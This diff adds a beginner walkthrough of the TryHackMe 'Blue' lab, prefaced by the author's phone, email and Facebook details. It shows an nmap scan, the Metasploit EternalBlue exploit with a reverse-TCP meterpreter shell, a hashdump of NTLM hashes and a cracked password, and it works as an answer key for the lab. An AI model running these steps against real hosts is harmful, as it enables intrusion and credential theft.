@@ -1,0 +1,569 @@
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''
+'' 		 Try Hack Me : Blue 
+'' 
+''
+''		Try Hack Me , My User Name : Lime1O1
+'' 
+''
+''		Phone : 01026102300
+''
+''		Email : Lime1O1Red@gmail.com 
+''
+''		Facebook : https://www.facebook.com/profile.php?id=100070215322755 
+''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+
+
+Introduction
+	
+	The aim of this lab is to deploy & hack into a Windows machine, leveraging common misconfiguration issues. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.
+
+
+
+
+Prerequisites : 
+	
+	Red Primer series: Nmap, Metasploit are recommended so you have a base understanding of Nmap and how to navigate Metasploit.
+
+Recon : 
+	Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
+
+
+
+Scan the Machine — For this i will use nmap to check for any potential vulnerabilities with the below command:
+
+$ sudo nmap -A 10.10.198.110  --script vuln 
+
+
+################################################################################################
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 20:11 EDT
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+Nmap scan report for 10.10.198.110 (10.10.198.110)
+Host is up (0.31s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+3389/tcp  open  tcpwrapped
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+| rdp-vuln-ms12-020: 
+|   VULNERABLE:
+|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2012-0152
+|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
+|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
+|           
+|     Disclosure date: 2012-03-13
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
+|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
+|   
+|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2012-0002
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
+|           
+|     Disclosure date: 2012-03-13
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
+|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
+|_sslv2-drown: 
+49152/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49153/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49154/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49158/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49159/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/27%OT=135%CT=1%CU=42771%PV=Y%DS=5%DC=T%G=Y%TM=61525E
+OS:82%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS
+OS:=7)OPS(O1=M509NW8ST11%O2=M509NW8ST11%O3=M509NW8NNT11%O4=M509NW8ST11%O5=M
+OS:509NW8ST11%O6=M509ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
+OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M509NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
+OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
+OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
+OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
+OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
+OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
+OS:=N%T=80%CD=Z)
+
+Network Distance: 5 hops
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   263.81 ms 10.17.0.1 (10.17.0.1)
+2   ... 4
+5   315.46 ms 10.10.198.110 (10.10.198.110)
+
+########################################################################################################
+
+
+It’s A Windows 7 Machine.
+
+How many ports are open with a port number under 1000 : ?
+		
+		135/tcp   open  msrpc        Microsoft Windows RPC
+		|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+		139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+		|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+		445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+		|_clamav-exec: ERROR: Script execution failed (use -d to debug)	 
+	
+
+
+
+
+
+
+What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08–067) ? nmap --script vuln 
+
+		Host script results:
+		|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+		|_smb-vuln-ms10-054: false
+		|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+		| smb-vuln-ms17-010: 
+		|   VULNERABLE:
+		|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+		|     State: VULNERABLE
+		|     IDs:  CVE:CVE-2017-0143
+		|     Risk factor: HIGH
+		|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+		|        servers (ms17-010).
+
+############################################################################################################################
+
+Before going any further, it is always advisable to check first if the host is vulnerable, before firing up an exploit in penetration testing. Because we do not want to harm the host with a careless exploit. So, to check this we can run auxiliary module with following command:
+
+
+$ msfconsole 
+$ use auxiliary/scanner/smb/smb_ms17_010
+$ show options 
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                                                              Required  Description
+   ----         ---------------                                                              --------  -----------
+   CHECK_ARCH   true                                                                         no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                                                         no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                                                        no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /opt/metasploit-framework/embedded/framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT        445                                                                          yes       The SMB service port (TCP)
+   SMBDomain    .                                                                            no        The Windows domain to use for authentication
+   SMBPass                                                                                   no        The password for the specified username
+   SMBUser                                                                                   no        The username to authenticate as
+   THREADS      1                                                                            yes       The number of concurrent threads (max one per host)
+
+################################################################################################################################
+
+$ set rhosts 10.10.46.155
+$ run 
+
+[+] 10.10.46.155:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.46.155:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+########################################################################################################################
+
+
+A critical remote code execution vulnerability exists in Microsoft SMBv1
+
+search in Google , Metasploit , searchsploit => ( ms17-010 ) 
+
+
+
+	'''
+	ms17_010_eternalblue is a remote exploit against Microsoft Windows, originally written by the Equation Group (NSA) and leaked by Shadow Brokers (an unknown hacking entity). It is considered a reliable exploit and allows you to gain access not only as SYSTEM - the highest Windows user mode privilege, but also full control of the kernel in ring 0. In modern day penetration tests, this exploit can be used in internal and external environments.
+
+	As far as remote kernel exploits go, this one is highly reliable and safe to use.
+
+	The check command of ms17_010_eternalblue is also highly accurate, because Microsoft's patch inadvertently added an information disclosure with extra checks on vulnerable code paths. 
+				
+
+			exploit : https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb
+			exploit : https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/ms17_010_eternalblue.md	
+	'''
+
+$ searchsploit eternalblue
+
+
+
+
+Gain Access:
+	Exploit the machine and gain a foothold.
+
+
+Start Metasploit
+
+$ sudo msfconsole
+
+	Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)
+
+
+As we know from the previous task “ms17–010” is available on this machine, so my utilising the “search” command we can find the path for this exploit.
+
+$  search ms17-010    ||  $ search eternalblue
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+#####################################################################################################################################
+
+
+Now with the above information we can copy the full path of the code for the answer:
+		exploit/windows/smb/ms17_010_eternalblue
+
+
+
+
+$ use exploit/windows/smb/ms17_010_eternalblue
+$ show options
+
+
+		Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+	   Name           Current Setting  Required  Description
+	   ----           ---------------  --------  -----------
+	   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+	   RPORT          445              yes       The target port (TCP)
+	   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
+	                                             t machines.
+	   SMBPass                         no        (Optional) The password for the specified username
+	   SMBUser                         no        (Optional) The username to authenticate as
+	   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
+	                                             chines.
+	   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+	Payload options (windows/x64/meterpreter/reverse_tcp):
+
+	   Name      Current Setting  Required  Description
+	   ----      ---------------  --------  -----------
+	   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+	   LHOST     192.168.1.9      yes       The listen address (an interface may be specified)
+	   LPORT     4444             yes       The listen port
+
+
+	Exploit target:
+
+	   Id  Name
+	   --  ----
+	   0   Automatic Target
+
+
+	########################################################################################################################################
+
+
+The one value we need to sit is the target host so the answer is: [ RHOSTS ]
+
+
+First you need to set the target machine so type in:
+
+$ set RHOSTS "MACHINE-IP"
+$ set LHOST  "YOUR-IP"
+$ set LPORT   "YOUR-LIS-PORT"
+
+$ set payload windows/x64/meterpreter/reverse_tcp 
+$ set LHOST  "YOUR-IP"
+$ set LPORT   "YOUR-LIS-PORT"
+$ set session 1 
+
+$ run 
+
+[*] Started reverse TCP handler on 10.17.25.250:5555 
+[*] 10.10.198.110:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.198.110:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.198.110:445     - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.198.110:445 - The target is vulnerable.
+[*] 10.10.198.110:445 - Connecting to target for exploitation.
+[+] 10.10.198.110:445 - Connection established for exploitation.
+[+] 10.10.198.110:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.198.110:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.198.110:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.198.110:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.198.110:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.198.110:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.198.110:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.198.110:445 - Sending all but last fragment of exploit packet
+[*] 10.10.198.110:445 - Starting non-paged pool grooming
+[+] 10.10.198.110:445 - Sending SMBv2 buffers
+[+] 10.10.198.110:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.198.110:445 - Sending final SMBv2 buffers.
+[*] 10.10.198.110:445 - Sending last fragment of exploit packet!
+[*] 10.10.198.110:445 - Receiving response from exploit packet
+[+] 10.10.198.110:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.198.110:445 - Sending egg to corrupted connection.
+[*] 10.10.198.110:445 - Triggering free of corrupted buffer.
+
+
+
+
+
+Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.
+
+
+	C:\Windows\system32>
+
+
+#############################################################################################################################################
+
+
+Escalate : 
+	Escalate privileges, learn how to upgrade shells in metasploit.
+
+
+If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
+
+
+Google this: shell_to_meterpreter
+https://null-byte.wonderhowto.com/how-to/upgrade-normal-command-shell-metasploit-meterpreter-0166013/
+https://linux-blog.anracom.com/2020/11/29/penetration-testing-kali-metasploit-upgrade-of-a-session-to-meterpreter/
+
+
+post/multi/manage/shell_to_meterpreter
+
+
+
+
+Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)
+
+
+$ use post/multi/manage/shell_to_meterpreter
+$ show options
+
+
+The answer for this question is “session” as we already have one established so we just need to select where to run the above:
+Set the required option, you may need to list all of the sessions to find your target here.
+
+
+$ set SESSION 1
+$ set lhost [ YOUR-IP ]
+$ sessions -i 1
+
+
+meterpreter >
+
+
+Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 
+
+
+###############################
+meterpreter > pwd
+C:\Windows\system32
+############################333
+
+meterpreter > shell
+
+#######################################
+
+C:\Windows\system32>whoami	
+whoami
+nt authority\system
+
+#################################################
+
+
+
+
+
+
+
+
+
+
+
+C:\Windows\system32>systeminfo
+
+
+
+Host Name:                 JON-PC
+OS Name:                   Microsoft Windows 7 Professional 
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Jon
+Registered Organization:   
+Product ID:                00371-177-0000061-85337
+Original Install Date:     12/12/2018, 9:13:23 PM
+System Boot Time:          9/29/2021, 1:47:53 AM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
+BIOS Version:              Xen 4.2.amazon, 8/24/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-06:00) Central Time (US & Canada)
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,537 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,361 MB
+Virtual Memory: In Use:    734 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 2 Hotfix(s) Installed.
+                           [01]: KB2534111
+                           [02]: KB976902
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Local Area Connection 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address(es)
+                                 [01]: 10.10.46.155
+                                 [02]: fe80::b477:5a64:33e8:e19f
+
+
+
+
+
+Run the {ps} command to check about all the processes that are running on the system. There are a lot of processes running as the NT Authority. So, I have noted down the PID of the searchIndexer.exe process.
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 536   676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 540   532   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 588   532   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 600   580   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 640   580   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 676   588   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 712   588   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 720   588   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 760   676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 824   676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 896   676   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 948   676   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1008  640   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1104  676   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1152  536   Defrag.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\defrag.exe
+ 1204  676   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1328  676   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1364  676   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1428  676   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1440  824   WmiPrvSE.exe
+ 1500  676   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1608  540   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 1612  676   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1640  676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 1744  676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 1916  676   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1932  1328  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
+ 2212  540   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2584  676   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+ 2884  676   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 2912  676   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2948  676   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 3060  676   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+
+
+
+###################################################################################################################################
+
+
+Now as we have complete control of the target machine, we can crack some passwords. For that, we need to dump the non-default user’s password and crack it.
+
+
+meterpreter > hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+
+################################################################################################
+
+Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
+
+	# jon 
+
+
+
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+Windows OS used to have LM hashing to store passwords, but it moved over to using NTLM. This hashdump can be broken into following: (each separated by a colon):
+
+
+
+Now, this is the fun part. We can use hashcat to crack this password but some online software like Crackstation will also work fine to crack this type of weak NTLM passwords. Let’s try it with that CrackStation available at  https://crackstation.net/
+
+URL : https://crackstation.net/
+
+
+
+ffb43f0de35be4d9917ac0cc8ad57f8d : alqfna22
+
+
+Copy this password hash to a file and research how to crack it. What is the cracked password?
+ 		
+ 		alqfna22
+
+
+ Now we need to find the three flags planted on this machine. These are not traditional flags, rather, they are meant to represent key locations within the Windows system.
+
+
+
+THIS COMMAND VERY VERY GOOD .....
+
+meterpreter > search -f flag*.txt
+Found 3 results...
+    c:\flag1.txt (24 bytes)
+    c:\Users\Jon\Documents\flag3.txt (37 bytes)
+    c:\Windows\System32\config\flag2.txt (34 bytes)
+
